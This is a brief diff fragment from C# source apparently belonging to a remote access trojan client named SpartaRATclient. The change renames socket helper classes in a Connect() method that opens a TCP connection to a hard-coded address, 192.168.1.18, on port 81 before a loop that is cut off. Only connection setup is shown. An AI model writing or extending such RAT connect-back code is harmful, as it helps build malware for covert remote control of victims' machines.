@@ -11,8 +11,8 @@ namespace SpartaRATclient
     {
         public static System.Net.Sockets.Socket Connect()
         {
-            System.Net.Sockets.Socket ServerSocketObject = RATclientSparta.Socket.Socket.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            IPEndPoint IPEndpoint = RATclientSparta.Socket.EndPoint.Set("192.168.1.18", 81);
+            System.Net.Sockets.Socket ServerSocketObject = RATclientSparta.Socket.SocketServer.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            IPEndPoint IPEndpoint = RATclientSparta.Socket.ClientEndPoint.Set("192.168.1.18", 81);
 
             while (true)
             {
